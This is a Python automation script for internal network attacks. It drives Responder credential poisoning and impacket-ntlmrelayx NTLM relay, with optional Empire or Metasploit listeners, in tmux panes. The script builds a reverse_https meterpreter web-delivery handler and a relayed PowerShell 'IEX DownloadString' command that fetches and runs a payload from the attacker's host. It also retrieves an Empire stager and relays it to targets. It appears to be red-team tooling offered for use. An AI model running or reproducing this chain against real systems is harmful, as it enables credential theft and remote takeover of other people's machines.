#!/usr/bin/env python3

import argparse
import logging
import os
import time
import requests
import subprocess
import fileinput
import libtmux

def main():
    
    #------------------------------------------------------------------------------
    # Configure Argparse to handle command line arguments
    #------------------------------------------------------------------------------
    desc = "Responder / NTLMRelayX automation script with optional Empire / DeathStar listeners"
    
    parser = argparse.ArgumentParser(description=desc)
    
    parser.add_argument('-d','--debug',
                        help='Print lots of debugging statements',
                        action="store_const",dest="loglevel",const=logging.DEBUG,
                        default=logging.WARNING
    )
    parser.add_argument('-v','--verbose',
                        help='Be verbose',
                        action="store_const",dest="loglevel",const=logging.INFO
    )
    parser.add_argument('host_ip', help='Host IP',
                        nargs='?', default = ''
    )
    parser.add_argument('target_ip', help='Target IP / Range / Subnet (nmap format)',
                        nargs='?', default = ''
    )
    parser.add_argument('--port', '-p', help='Port for Empire listener / MSF web handler (443)',
                        default='443'
    )
    
    parser_command=parser.add_mutually_exclusive_group(required=True)
    
    parser_command.add_argument('--capture', help='Capture credentials only - no relay',
                        action='store_const', dest='action', const='capture', default='capture'
    )
    parser_command.add_argument('--empire', help='Start Empire listener as relay target',
                        action='store_const', dest='action', const='empire'
    )
    parser_command.add_argument('--msf', help='Start Metasploit listener as relay target',
                        action='store_const', dest='action', const='msf'
    )
    parser_command.add_argument('--command', help='Command to relay to targets',
                        dest='action'
    )

    args = parser.parse_args()
    
    host_ip = args.host_ip
    target_ip = args.target_ip
    empire_lport = args.port
    msf_srvport = args.port
    msf_lport = '8443'
    action=args.action
    
    if action=='capture':
        launch_relayx=False
        launch_empire=False
        launch_msf=False
        window_layout='even-horizontal'
    elif action=='empire':
        launch_relayx=True
        launch_empire=True
        launch_msf=False
        window_layout='tiled'
    elif action=='msf':
        launch_relayx=True
        launch_empire=False
        launch_msf=True
        window_layout='main-vertical'
    else:
        launch_relayx=True
        launch_empire=False
        launch_msf=False
        relayx_command=action
        window_layout='even-horizontal'
    
    if not host_ip:
        host_ip = input("\nEnter interface IP address to listen on: ")
    if not target_ip and not action=='capture':
        target_ip = input("\nEnter relay target IP / Range / Subnet (nmap format): ")
    
    empire_user = os.environ['EMPIRE_USER']
    empire_pass = os.environ['EMPIRE_PASS']
    
    # Run base image docker entrypoint so environment variables are parsed into config files like normal
    subprocess.Popen("/opt/entrypoint.sh", shell=True).wait()
    
    # Set up tmux window
    tmux_server = libtmux.Server()
    tmux_session = tmux_server.new_session(session_name="mitm", window_name="mitm", kill_session=True)
    tmux_window =  tmux_session.select_window("mitm")
    tmux_pane = tmux_window.attached_pane
    
    if launch_relayx:
        print("Getting relay target list")
        subprocess.Popen("/opt/check-smb-signing.sh --finger --host-discovery --finger-path /usr/share/responder/tools/RunFinger.py --out-dir /tmp -a %s" % (target_ip), shell=True).wait()
    
    if launch_empire:
        print("\nLaunching Empire Server(waiting 10s)...")
        command = 'python3 empire.py server'
        tmux_pane.send_keys(command)
        time.sleep(10)
        
        tmux_pane = tmux_pane.split_window()
        
        print("\nLaunching Empire Client(waiting 20s)...")
        command = 'python3 empire.py client -r /opt/scripts/listener_http.rc'
        tmux_pane.send_keys(command)
        time.sleep(20)
        
        print("\nGetting API Token...")
        requests.packages.urllib3.disable_warnings()        #Disable untrusted SSL cert warning
        json = requests.post('https://localhost:1337/api/admin/login', verify=False, json={"username":empire_user, "password":empire_pass}).json()
        empire_token = json['token']
        print("Token: " + empire_token)
        
        print("\nGetting powershell stager...")
        json = requests.post('https://localhost:1337/api/stagers?token=' + empire_token, verify=False, json={"StagerName":"multi/launcher", "Listener":"http"}).json()
        empire_stager = json['multi/launcher']['Output']
        print("Stager: " + empire_stager)
        
        relayx_command = empire_stager
        
        tmux_pane = tmux_pane.split_window()
        
    if launch_msf:
        command = 'msfconsole -q -x "use exploit/multi/script/web_delivery; set target 2; set uripath /; set ssl true; set srvport %s; set payload windows/meterpreter/reverse_https; set exitonsession false; set lhost %s; set lport %s; set enablestageencoding true; set autorunscript migrate -f; exploit -j -z"' % (msf_srvport, host_ip, msf_lport)
        tmux_pane.send_keys(command)
        
        relayx_command = 'powershell -nop -exec bypass -c "IEX((New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/code_execution/Invoke-MetasploitPayload.ps1\'); Invoke-MetasploitPayload \'https://%s:%s/\'"' % (host_ip, msf_srvport)
        
        tmux_pane = tmux_pane.split_window()
        
    if launch_relayx:
        for line in fileinput.input("/usr/share/responder/Responder.conf", inplace=True):
            line=line.replace("SMB = On","SMB = Off")
            line=line.replace("HTTP = On","HTTP = Off")
            line=line.replace("HTTPS = On","HTTPS = Off")
            print(line)
        fileinput.close()
        
        if os.path.exists("/tmp/hosts-signing-false"):
            command = "impacket-ntlmrelayx -smb2support -socks -tf %s -c '%s'" % ("/tmp/hosts-signing-false.txt", relayx_command)
        else:
            command = "impacket-ntlmrelayx -smb2support -socks -c '%s'" % (relayx_command)
            
        
        tmux_pane.send_keys(command)
        
        tmux_pane = tmux_pane.split_window()
    
    # Temporarily disable to be quieter
    
    # for line in fileinput.input("/usr/share/responder/Responder.conf", inplace=True):
    #     line=line.replace("Challenge = Random","Challenge = 1122334455667788")
    #     print(line)
    # fileinput.close()
    
    command = "responder -I eth0 -d -w -e " + host_ip
    
    tmux_pane.send_keys(command)
    
    tmux_window.select_layout(window_layout)
    tmux_server.attach_session(target_session="mitm")
    
    
    
if __name__ == '__main__':
    main()